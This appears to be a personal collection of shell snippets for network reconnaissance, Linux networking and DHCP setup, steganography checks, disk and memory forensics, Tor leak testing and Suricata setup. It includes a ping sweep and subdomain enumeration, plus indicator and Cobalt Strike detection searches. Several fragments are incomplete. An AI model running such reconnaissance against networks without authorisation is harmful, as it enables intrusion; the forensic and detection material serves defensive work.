for x in $(cat tmp); do
     host $x | grep 'has address' | cut -d ' ' -f1,4 >> tmp2
done

if [ -e tmp2 ]; then
     cat tmp2 | grep $domain | column -t | sort -u
fi







##-==============================-##
##  [+] Ping sweep a Class C
##-==============================-##

echo "Usage: 192.168.1"

read -p "Class: " class


for x in `seq 1 254`; do
     ping -c1 $class.$x | grep 'bytes from' | cut -d ' ' -f4 | cut -d ':' -f1 &
done









echo -n "Enter a domain: "
read domain





sslyze $domain --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers > tmp

grep 'X509v3 Subject Alternative Name:' tmp | sed 's/      X509v3 Subject Alternative Name:   //g' | sed 's/, DNS:/\n/g' | sed 's/www.//g' | sed 's/DNS://g' > tmp2

# Remove trailing whitespace from each line
sed 's/[ \t]*$//' tmp2 | sort -u > tmp3

echo
cat tmp3




iwconfig wlan0 essid "MyNetwork" key s:mypassword



iwlist wlan0 scan


route add default gw 192.168.1.1


ip addr show
ip route show


 ifconfig eth0 up 192.168.1.67 netmask 255.255.255.0



 cat /etc/network/interfaces
# interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback
auto eth0
iface eth0 inet dhcp
dns-nameservers 192.168.0.103 192.168.0.1


auto br0
    iface br0 inet static
    address 10.0.8.1
    netmask 255.255.255.0
    bridge_ports vpn
    bridge_stp off
    bridge_maxwait 1
    bridge_fd 0
    up ip addr add 10.0.8.1/24 dev br0
    down ip addr del 10.0.8.1/24 dev br0


	
auto br0
    iface br0 inet static
    address 45.32.68.7
    netmask 255.255.254.0
    gateway 45.32.68.1
    dns-nameserver 8.8.8.8
    dns-nameserver 8.8.4.4
    bridge_ports ens3 vpn
    bridge_stp off
    bridge_maxwait 1
    bridge_fd 0
    up ip addr add 10.0.8.1/24 dev br0
    down ip addr del 10.0.8.1/24 dev br0
	
	
	

# DNS
option domain-name-servers 21.31.0.2;
# SMTP
option smtp-server 21.31.0.3;
# POP3
option pop-server 21.31.0.4;
# NEWS
option nntp-server 21.31.0.5;
# NTP
option time-servers 21.31.0.6;


# DNS
option domain-name-servers dns.company.com;
# SMTP
option smtp-server smtp.company.com;
# POP3
option pop-server pop3.company.com;
# NEWS
option nntp-server news.company.com;
# NTP
option time-servers ntp.company.com;


option routers 21.31.36.1;
option lpr-servers 21.31.36.2, 21.31.37.2, 21.31.38.2, 21.31.37.3;

hardware ethernet AA:88:54:72:7F:92;
fixed-address 21.31.55.211;
option host-name "luke";




route add -net 192.168.10.0 netmask 255.255.255.0 dev eth0
route add -net 192.168.20.0 netmask 255.255.255.0 gw 192.168.1.10
route add default gw 192.168.1.1 eth1



Flags Possible flags include:
	U - Route is up
	H - Target is a host
	G - Use gateway
	R - Reinstate route for dynamic routing
	D - Dynamically installed by daemon or redirect
	M - Modified from routing daemon or redirect
	C - Cache entry
	! - Reject route


Metric 		## The “distance” to the target (usually counted in hops).
Ref 		## Number of references to this route.
Iface 		## Interface to which packets for this route will be sent.




echo "local7.debug /var/log/dhcpd.log" >> dhcpd.conf






## Create a ssh tunnel

ssh -f -L 9000:targetservername:8088 root@192.168.14.72 -N


#-f: run in background; -L: Listen; -N: do nothing
#the 9000 of your computer is now connected to the 8088 port of the targetservername through 192.168.14.72
#so that you can see the content of targetservername:8088 by entering localhost:9000 from your browser.
```


# Check list
gsettings list-recursively

# Change some settings
gsettings set org.gnome.gedit.preferences.editor highlight-current-line true
gsettings set org.gnome.gedit.preferences.editor scheme 'cobalt'
gsettings set org.gnome.gedit.preferences.editor use-default-font false
gsettings set org.gnome.gedit.preferences.editor editor-font 'Cantarell Regular 12'







# format xml file
xmllint --format file.xml





##-===================-##
##  [+] byte content 
##-===================-##
## ------------------------------ ##
##  [?] first column is offset
## ------------------------------ ##
hexdump $File


##-==================================-##
##  [+] bytes and ASCII characters
##-==================================-##
hexdump -C $File


##-======================-##
##  [+] first 16 bytes
##-======================-##
hexdump -n 16 $File


##-=====================================-##
##  [+] bytes starting from 16th byte
##-=====================================-##
hexdump -s 16 $File





##-================================================-##
##  [+] Check object/executable file information

    objdump
    readelf

##-===================-##
##  [+] Disamble

objdump -S <ELF file>


##-=====================================-##
##  [+] Display dynamic symbol tables

objdump -T <ELF file>
readelf --dyn-syms <ELF file>











































echo "################################"
echo "########## stegdetect ##########"
echo "################################"

stegdetect $FILE


echo "##############################"
echo "########## steghide ##########"
echo "##############################"

steghide extract -sf $FILE -p ""


echo "##############################"
echo "########## outguess ##########"
echo "##############################"

outguess -r $FILE $TMP_FILE
check_result_file $TMP_FILE


stegoveritas.py $FILE -outDir $TMP_DIR -meta -imageTransform -colorMap -trailing



identify -verbose stego.jpg


## Carve out embedded/appended files
foremost stego.jpg


ffmpeg -v info -i stego.mp3 -f null - to recode the file and throw away the result




#Log fls
sudo fls /forensic/floppy$1/forensic$1.iso > /forensic/floppy$1/logs/logfls$1.txt

#Change directory
cd floppy$1

#acquire file E01
yes "" | sudo ewfacquire /dev/fd0 -D floppy$1 -e floppysic -C 1.1 -N floppy$1 -E $1 -D floppy$1 -t floppy$1 -l ~/forensic/floppy$1/logs/ewfacquire$1.txt -m removable -M physical -f encase6 -c deflate -o 0 -B 737280 -S 1.4 -P 512 -g 64 -b 64 -w

#List files and directories in disk image
sudo fls -r -m "/" -i ewf floppy$1.E01 >> ewf$1.txt

#Make timeline in csv format
sudo mactime -b ewf$1.txt -d > mactime$1.csv


#Search file 
#fls -r -F floppy2.E01 |grep


#Take back node 28 
#icat floppy2.E01 28 > test22.PAS







ffmpeg -i contaminated.mov -acodec copy -vcodec copy clean.mov




Generate a timeline

    log2timeline.py --status_view window --hashers MD5 ${TZ} ${DATADIR}/${HOSTNAME}.pb ${MOUNTPOINT}

Parse the MFT into a bodyfile format
2. analyzeMFT.py --bodyfull -b ${DATADIR}/${HOSTNAME}.bodyfile -f ${MOUNTPOINT}/$MFT

Read the bodyfile into the existing Plaso file
3. log2timeline.py ${DATADIR}/${HOSTNAME}.pb ${DATADIR}/${HOSTNAME}.bodyfile

Post process the plaso timeline, apply various analyses, and output to t2tcsv to be fed to logstash
4. psort.py --tagging-file /usr/share/plaso/tag_windows.txt ${TZ} -o l2tcsv -w ${DATADIR}/${HOSTNAME}.csv ${DATADIR}/${HOSTNAME}.pb


grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" strings.txt





ls -1d /proc/fs/ext*/* /proc/fs/xfs*/* | awk -F/ '{ print $NF }' | while read PART; do
  echo /dev/$PART
done | while read DEV; do
  fls -m/ -r $DEV >> timeline.body
done

log2timeline.py timeline.pb timeline.body

psort.py -o l2tcsv -w timeline.csv timeline.pb



# Create new profile of Linux for use in Volatility
#
VOLHOME=~/volatility
OSNAME="myos"
 cd $VOLHOME/tools/linux && make
 zip /usr/local/lib/python2.7/dist-packages/volatility/plugins/overlays/$OSNAME.zip \
    /boot/System.map-3.13.0-62-generic $VOLHOME/tools/linux/module.dwarf 




### reassembly of packets + splitting in smaller reassembled pcaps.
 tshark -o 'tcp.desegment_tcp_streams:TRUE' -r "$1" -T fields -e tcp.stream | sort -un | tr '\n' ' ' > streams
 rm -rf ${SDIR}; mkdir ${SDIR}
 for x in `cat streams`; do 
    tshark -F pcap -r "$1" -w "${SDIR}/${x}.pcap" tcp.stream eq $x
    echo "Finished stream ${x}"
  done

  
  
  
  
  use the Sleuthkit to make a timeline

    fls –rd / > filedump.txt
    mactime –b filedump.txt > filedump_mac.txt

  
  VMTYPE=`vmdkinfo $file 2>/dev/null | grep 'Disk type:' | awk -F: '{ print $2 }'`
FILETYPE=`file $file | awk -F: '{ print $2 }' | sed 's?^ ??'`
  vhdimount $file $vhdmt
  vmdkmount $file $vmdkmt
  
  
  mmls -Ma $file | grep 'Linux Logical' | while read FS; do
    echo "Found partition of type Linux Logical Volume"
    OFFSET=$((`echo $FS | awk '{ print $3 }' | sed 's?^0*??'`*512))
  
  mmls -Ma $file | grep 'Linux (' | while read FS; do
    echo "Found partition of type Linux Native"
    OFFSET=$((`echo $FS | awk '{ print $3 }' | sed 's?^0*??'`*512))
  
  echo "Mounting Linux partition $file offset $OFFSET as $mt"
      mount -o ro,noload,offset=$OFFSET $file $mt
  
  
  mount -t ntfs -o ro,show_sys_files,streams_interface=windows,offset=$OFFSET $file $mt





mount a VHD image:

vhdimount image.vhd /mnt/fuse
vhdimount -X allow_root image.vhd /mnt/fuse

mount -o loop,ro,offset=${OFFSET} /mnt/fuse/vhdi1 /mnt/file_system

umount /mnt/fuse
fusermount -u /mnt/fuse




ewfmount 'image location' 'mountpoint'


ewfmount $file $e01mt











vol.py -f memdump.vmem --profile=Win2008R2SP1x64_23418 imagecopy -O memdump.mem


strings -o -el memdump.mem > memdump.txt
strings -o  memdump.mem >> memdump.txt
egrep -iwF 'badguy.net|45.xxx.xxx.xxx' memdump.txt > badguy.txt
less badguy.txt



vol.py -f memdump.mem --profile=Win2008R2SP1x64_23418 yarascan -y /tmp/cobalt.yar

vol.py --plugins=/plugings/cobalt -f memdump.mem --profile=Win2008R2SP1x64_23418 cobaltstrikeconfig -p 5352


python vol.py -f ~/Desktop/win7_trial_64bit.raw imageinfo







Exposing images
    works with E01s, VMDKS, RAW, bitlocker, LVM

imount /path/to/VMDK





#Simple script for VirtuaBox memory extraction
# Usage: vboxmemdump.sh <VM name>

VBoxManage debugvm $1 dumpvmcore --filename=$1.elf

size=0x$(objdump -h $1.elf|egrep -w "(Idx|load1)" | tr -s " " |  cut -d " " -f 4)
off=0x$(echo "obase=16;ibase=16;`objdump -h $1.elf|egrep -w "(Idx|load1)" | tr -s " " |  cut -d " " -f 7 | tr /a-z/ /A-Z/`" | bc)
head -c $(($size+$off)) $1.elf|tail -c +$(($off+1)) > $1.raw


#Get debugfs stat for all inodes
debugfs -R "stat <$line>" "$myrootdrive" | cat >> "$SAVETO/full_inode_extract_output.txt" 



#Get list of deleted inodes.
get_deleted_files(){

myrootdrive=$(df | awk '{print $1}' | grep /)

debugfs -R "lsdel" "$myrootdrive" | cat > "$SAVETO/deleted_files.txt"






IMG_TYPE=$(img_stat $1 | grep "Image Type:")

xmount --in $ITYPE --out dd ${imm[@]} $MNTPNT


mount -t auto -o ro,loop,noauto,noexec,nodev,noatime,offset=$off,umask=222 $imm $BASE_IMG


icat -f $fs -o $offs $imm $ind > $outputdir/${f##*/}


fsstat -o $offs $imm | grep -ia "File System Type:\|cluster size\|block size\|sector size"


fls -f list


inode=$(ifind -f $fs -o $offs -d $d $imm)


ffind -f $fs -o $offs $imm $ind)
echo "FILE NAME: "$f


blkcat -f $fs -o $offs $imm $d | xxd -l $ss








































nameserver 10.8.0.1
nameserver 193.138.218.74

https://t.me/socks?server=10.8.0.1&port=1080
https://t.me/socks?server=10.8.0.1&port=1080















Checking for leaks

you need to identify the Tor guard IP, you can use ss, netstat or GETINFO entry-guards through the tor controller to identify the guard IP.

ss -ntp | grep "$(cat /var/run/tor/tor.pid)"

With the interface and guard IP at hand, we can now use tcpdump to check for possible non-tor leaks. Replace IP.TO.TOR.GUARD with the IP you got from the ss output.

tcpdump -n -f -p -i eth0 not arp and not host IP.TO.TOR.GUARD





tar tvf test.tar 



pax -r -s ',^/,,' -f ./test.tar





Clusters in the Expanse-Understanding and Unbiasing IPv6 Hitlists
IPv6 Security-Attacks and Countermeasures in a Nutshell

Security Implications of IPv6 on IPv4 networks-draft-gont-opsec-ipv6-implications-on-ipv4-nets-00


OAuth 2.0 Mutual-TLS Client Authentication and Certificate-Bound Access Tokens
							 
Secret Key Transaction Authentication for DNS (TSIG)
zone transfer (AXFR) [RFC5936] over TCP from DNS servers


"Secret Key Establishment for DNS (TKEY RR)" [RFC2930]



"Resource Records for the DNS Security Extensions"
 [RFC4034]

Use of SHA-256 in DNSSEC Delegation Signer (DS) Resource
 Records (RRs)" 

Use of SHA-2 Algorithms with RSA in DNSKEY and RRSIG
 Resource Records for DNSSEC" [RFC5702]

"Use of SHA-256 in DNSSEC Delegation Signer
 (DS) Resource Records (RRs)", RFC 4509,

 
  [RFC1995] Ohta, M., "Incremental Zone Transfer in DNS", RFC 1995,

 
 
 
  DNS Security [RFC2535] is a method for supplying cryptographic
 verification information along with DNS messages. Public Key
 Cryptography is used in conjunction with digital signatures to
 provide a means for a requester of domain information to authenticate
 the source of the data. This ensures that it can be traced back to a
 trusted source, either directly, or via a chain of trust linking the
 source of the information to the top of the DNS hierarchy.

 
 
 

Create POSIX tar archive

tar(1) and cpio(1) are not fully platform agnostic, although their file formats are specified in POSIX.1-2001. As such, GNU tar(1) might not be able to extract a BSD tar(1) archive, and ivce versa. pax(1) is defined in POSIX.1-2001. To extract an archive: pax -rf archive.tar

0
pax -wf archive.tar /path




extract an archive: pax -rf archive.tar




















/etc/suricata/   <--- Configuration Files
/etc/suricata/rules/  <--- Rules
/var/log/suricata/    <--- Log Files
/var/log/suricata/fast.log   <--- Log file with triggered rules


wget http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz
tar zxvf emerging.rules.tar.gz
sudo mkdir /var/lib/suricata/
sudo mv rules /var/lib/suricata/



edit suricata.yaml and find

default-rule-path: /var/lib/suricata/rules



run Suricata against the network interface on your host.

sudo suricata -c /etc/suricata/suricata.yaml -i eth0




 let's try running Suricata against a test pcap. In this test, I found a pcap with the popular ETERNALBLUE exploit from the Shadowbrokers / NSA episode. You could just as easily try triggering Suricata alerts
 

sudo suricata -c /etc/suricata/suricata.yaml -r ~/enternalblue.pcap
test@server:~$ cat /var/log/suricata/fast.log





